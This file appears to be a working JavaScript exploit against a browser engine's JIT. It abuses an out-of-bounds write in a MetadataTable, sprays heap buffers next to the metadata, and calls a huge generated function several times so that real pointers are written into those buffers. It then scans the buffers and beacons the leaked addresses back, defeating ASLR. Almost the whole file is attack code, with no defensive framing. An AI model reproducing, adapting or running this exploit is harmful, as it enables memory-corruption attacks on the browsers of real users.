// p218 — MetadataTable overflow: two-pass pointer leak
//
// KEY CORRECTIONS:
// 1. a(); generates op_call_ignore_result → NO ValueProfile → allocation ~100KB
//    (not 585MB as previously assumed)
// 2. 100KB metadata is same marge bitfit size class as 100KB spray buffers
// 3. Need TWO invocations:
//    Pass 1: setSeen (1 bit) on OOB entries in post-spray
//    Pass 2: linkMonomorphicCall writes real pointers to OOB entries
// 4. After pass 2, read pointers from post-spray = ASLR leak
//
// Allocation layout: sizeof(LinkingData)=16, offsetTables=312, metadata entries
// Total ~100,424 bytes. In-bounds entries: ~893. Entry 894+ is OOB.
//
// Beacon prefix: V218-

(function() {
  var BUF_SZ = 100096;
  var N_CALLS = 38348816;
  var THROW_AT = 920;

  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V218-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  // === STEP 1: Compile via Blob+script ===
  B('BUILD-START');

  var CHUNK = 4000000;
  var chunksN = Math.floor(N_CALLS / CHUNK);
  var rem = N_CALLS - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p218fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p218ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    B('COMPILED-' + (window.__p218ok ? 'OK' : 'FAIL'));
    if (!window.__p218ok) return;
    setTimeout(afterCompile, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  function afterCompile() {
    // === STEP 2: Post-spray zeroed 100KB ArrayBuffers ===
    // Same size class as metadata (~100KB) → adjacent in marge bitfit
    var postBufs = [];
    for (var i = 0; i < 40; i++) {
      postBufs.push(new ArrayBuffer(BUF_SZ));
    }
    B('POST-' + postBufs.length);

    // === STEP 3: PASS 1 — set setSeen on all entries 0-919 ===
    // Entries 0-892: in-bounds (write setSeen to allocated metadata)
    // Entries 893-919: OOB (write setSeen to post-spray — 1 bit per entry)
    B('P1-START');
    var p1Count = 0;
    try {
      window.__p218fn(function() {
        p1Count++;
        if (p1Count === 100) B('P1-M100');
        if (p1Count === 500) B('P1-M500');
        if (p1Count === 893) B('P1-M893');
        if (p1Count === 894) B('P1-M894-OOB');
        if (p1Count === 900) B('P1-M900');
        if (p1Count === 910) B('P1-M910');
        if (p1Count >= THROW_AT) throw new Error('P1');
        return 0;
      });
    } catch (e) {}
    B('P1-DONE-' + p1Count);

    // Quick scan after pass 1 — should see minimal writes (just setSeen bits)
    var p1mod = scanBufs(postBufs, 'P1-POST');

    // === STEP 4: PASS 2 — linkMonomorphicCall writes real pointers ===
    // DO NOT reset post-spray! setSeen bits from pass 1 must persist.
    // On pass 2:
    //   Entries 0-892 (in-bounds): seenOnce=true → linkMonomorphicCall (writes to allocated buffer)
    //   Entries 893-919 (OOB): seenOnce=true → linkMonomorphicCall → writes REAL POINTERS to post-spray!
    B('P2-START');
    var p2Count = 0;
    try {
      window.__p218fn(function() {
        p2Count++;
        if (p2Count === 100) B('P2-M100');
        if (p2Count === 893) B('P2-M893');
        if (p2Count === 894) B('P2-M894-LINK');
        if (p2Count === 900) B('P2-M900');
        if (p2Count >= THROW_AT) throw new Error('P2');
        return 0;
      });
    } catch (e) {}
    B('P2-DONE-' + p2Count);

    // === STEP 5: Scan post-spray for leaked pointers ===
    var p2mod = scanBufs(postBufs, 'P2-POST');

    // === STEP 6: PASS 3 (optional) — more OOB entries ===
    // If pass 2 worked, try extending the OOB range
    if (p2Count >= THROW_AT && p2mod > 0) {
      B('P3-START');
      var p3Count = 0;
      try {
        window.__p218fn(function() {
          p3Count++;
          if (p3Count >= 1100) throw new Error('P3');
          return 0;
        });
      } catch (e) {}
      B('P3-DONE-' + p3Count);
    }

    // === STEP 7: Pass 4 — third invocation to get pointers for wider range ===
    if (p2Count >= THROW_AT) {
      B('P4-START');
      var p4Count = 0;
      try {
        window.__p218fn(function() {
          p4Count++;
          if (p4Count >= 1100) throw new Error('P4');
          return 0;
        });
      } catch (e) {}
      B('P4-DONE-' + p4Count);
      scanBufs(postBufs, 'P4-POST');
    }

    B('ALL-DONE');
    postBufs = null;
  }

  function scanBufs(bufs, label) {
    var modified = 0;
    var totalNZ = 0;
    var firstBuf = -1;
    var firstOff = -1;

    for (var i = 0; i < bufs.length; i++) {
      var v = new Uint32Array(bufs[i]);
      var found = false;
      for (var j = 0; j < v.length; j++) {
        if (v[j] !== 0) {
          totalNZ++;
          if (!found) {
            found = true;
            modified++;
            if (firstBuf === -1) {
              firstBuf = i;
              firstOff = j;
            }
          }
        }
      }
    }

    B(label + '-MOD' + modified + '-NZ' + totalNZ);

    if (firstBuf >= 0) {
      var fv = new Uint32Array(bufs[firstBuf]);
      B(label + '-1ST-B' + firstBuf + '-O' + firstOff + '-V' + hex(fv[firstOff]));

      // Dump first 24 non-zero dwords with positions
      var dump = [];
      for (var k = 0; k < fv.length && dump.length < 24; k++) {
        if (fv[k] !== 0) dump.push(k + ':' + hex(fv[k]));
      }
      if (dump.length > 0) {
        var third = Math.ceil(dump.length / 3);
        B(label + '-Da-' + dump.slice(0, third).join('_'));
        if (dump.length > third)
          B(label + '-Db-' + dump.slice(third, third * 2).join('_'));
        if (dump.length > third * 2)
          B(label + '-Dc-' + dump.slice(third * 2).join('_'));
      }

      // Look for 8-byte pointer patterns (high bytes like 0x0000007f or 0xFFFF80)
      var ptrCount = 0;
      for (var p = 1; p < fv.length; p += 2) {
        var hi = fv[p];
        if (hi !== 0 && hi !== 0xFFFFFFFF) {
          // Non-trivial high dword = likely a pointer
          ptrCount++;
          if (ptrCount <= 4) {
            B(label + '-PTR' + ptrCount + '-O' + (p - 1) + '-' + hex(fv[p]) + hex(fv[p - 1]));
          }
        }
      }
      if (ptrCount > 0) B(label + '-PTRS-' + ptrCount);

      // Check stride pattern
      var nzPos = [];
      for (var m = 0; m < Math.min(3000, fv.length); m++) {
        if (fv[m] !== 0) nzPos.push(m);
      }
      if (nzPos.length >= 3) {
        var strides = [];
        for (var s = 1; s < Math.min(10, nzPos.length); s++) {
          strides.push(nzPos[s] - nzPos[s - 1]);
        }
        B(label + '-STRIDE-' + strides.join('_'));
      }
    }

    return modified;
  }
})();
